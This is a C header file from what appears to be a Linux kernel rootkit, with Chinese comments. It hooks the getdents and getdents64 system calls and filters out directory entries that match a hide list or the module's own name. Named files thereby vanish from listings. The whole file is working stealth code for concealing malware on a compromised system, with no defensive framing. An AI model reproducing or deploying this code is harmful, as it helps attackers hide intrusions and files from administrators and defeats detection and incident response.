/**
 * 文件隐藏和目录读取拦截头文件
 * 实现文件隐藏、目录读取过滤功能
 * 拦截getdents系统调用，隐藏指定文件
 */

#ifndef RFILE_H
#define RFILE_H

#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>
#include <linux/slab.h>

#include "config.h"

// 钩子表外部引用
extern hook_t _tbl[];

// 文件隐藏结构体
struct st_hide_file {
    char *name;                    // 要隐藏的文件名
    struct list_head list;         // 链表节点
};

// 隐藏文件链表头
LIST_HEAD(hide_files);

/**
 * 取消文件隐藏
 * 从隐藏列表中移除指定文件
 * @param name 要取消隐藏的文件名
 */
void file_unhide(char *name)
{
    struct st_hide_file *_file, *tmp;

    // 遍历隐藏文件链表
    list_for_each_entry_safe( _file, tmp, &hide_files, list )
    {
        if (strncmp(name, _file->name, strlen(_file->name)) == 0)
        {
            // 从链表中移除
            list_del(&_file->list);
			
            // 释放内存
            kfree(_file->name);
            kfree(_file);
            break;
        }
    }
}

/**
 * 隐藏文件
 * 将指定文件添加到隐藏列表
 * @param name 要隐藏的文件名
 */
void file_hide(char *name)
{
    struct st_hide_file *_file;
	
	// 参数检查
	if(name == NULL || name[0] == '\0') {
	  return;
	}

    // 分配隐藏文件结构体
    _file = kmalloc(sizeof(*_file), GFP_KERNEL);
    if ( ! _file )
        return;

    _file->name = name;

    // 添加到隐藏文件链表
    list_add(&_file->list, &hide_files);
}

/**
 * 查找文件是否在隐藏列表中
 * @param name 要查找的文件名
 * @return 1表示已隐藏，0表示未隐藏
 */
int lookup_files(char *name)
{
	struct st_hide_file *tmp_file;
    // 遍历隐藏文件链表
    list_for_each_entry( tmp_file, &hide_files, list ){
        // 检查文件名是否匹配
        if (strncmp(name, tmp_file->name, strlen(tmp_file->name)) == 0) {
            return 1;
        }
    }
	
	return 0;
}

/*
 * 前缀匹配函数（已注释掉的原版本）
 * 检查字符串是否以指定前缀开头
 */
/*
static int is_prefix(char* haystack, char* needle)
{
  char* haystack_ptr = haystack;
  char* needle_ptr = needle;

  if (needle == NULL) {
    return 0;
  }

  while (*needle_ptr != '\0') {
    if (*haystack_ptr == '\0' || *haystack_ptr != *needle_ptr) {
      return 0;
    }
    ++haystack_ptr;
    ++needle_ptr;
  }
  return 1;
}
*/

/**
 * 拦截getdents64系统调用
 * 过滤目录读取结果，隐藏指定文件
 * @param fd 文件描述符
 * @param dirp 目录项缓冲区
 * @param count 缓冲区大小
 * @return 实际读取的字节数
 */
asmlinkage int __getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  int ret;
	int result;
	hook_t *hk = NULL;
	asmlinkage int fn_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int pos = 0;

	// 获取钩子表项
	hk = &_tbl[3];

	// 调用原始的getdents64系统调用
	ret = ((typeof(fn_getdents64) *)hk->stub_bak)(fd, dirp, count); 
  
    // 分配内核缓冲区
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        // 从用户空间复制数据到内核空间
        error = copy_from_user(dirent_ker, dirp, ret);
    if (error)
        goto done;

    // 遍历每个目录项
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

		// 检查是否需要隐藏此文件
        if((lookup_files(current_dir->d_name) == 1) || (memcmp(_kname, current_dir->d_name, strlen(_kname)) == 0)) 
        {
			debug("test dir:1111 - %s \n", current_dir->d_name);
			
            // 如果是第一个目录项，需要特殊处理
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // 将当前目录项的长度加到前一个目录项上
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            // 不需要隐藏，更新前一个目录项指针
            previous_dir = current_dir;
        }

        // 移动到下一个目录项
        offset += current_dir->d_reclen;
    }

    // 将过滤后的结果复制回用户空间
    error = copy_to_user(dirp, dirent_ker, ret);
    if (error)
        goto done;

done:
    // 释放内核缓冲区
    kfree(dirent_ker);
    return ret;
}

// 32位目录项结构体定义
struct linux_dirent {
        unsigned long d_ino;       // 索引节点号
        unsigned long d_off;       // 目录中的偏移
        unsigned short d_reclen;   // 目录项长度
        char d_name[];             // 文件名
    };

/**
 * 拦截getdents系统调用（32位兼容）
 * 过滤目录读取结果，隐藏指定文件
 * @param fd 文件描述符
 * @param dirp 目录项缓冲区
 * @param count 缓冲区大小
 * @return 实际读取的字节数
 */
asmlinkage int __getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
    int ret;
   // int result;
	
    hook_t *hk = NULL;
	asmlinkage int fn_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

	// 获取钩子表项
	hk = &_tbl[2];

	// 调用原始的getdents系统调用
	ret = ((typeof(fn_getdents) *)hk->stub_bak)(fd, dirp, count); 

    // 分配内核缓冲区
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        // 从用户空间复制数据到内核空间
        error = copy_from_user(dirent_ker, dirp, ret);
    if (error)
        goto done;

    // 遍历每个目录项
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        // 检查是否需要隐藏此文件
        if((lookup_files(current_dir->d_name) == 1) || (memcmp(_kname, current_dir->d_name, strlen(_kname)) == 0)) 
        {
			debug("test dir:2222 - %s \n", current_dir->d_name);
            // 如果是第一个目录项，需要特殊处理
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // 将当前目录项的长度加到前一个目录项上
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            // 不需要隐藏，更新前一个目录项指针
            previous_dir = current_dir;
        }

        // 移动到下一个目录项
        offset += current_dir->d_reclen;
    }

    // 将过滤后的结果复制回用户空间
    error = copy_to_user(dirp, dirent_ker, ret);
    if (error)
        goto done;

done:
    // 释放内核缓冲区
    kfree(dirent_ker);

  return ret;
}

#endif

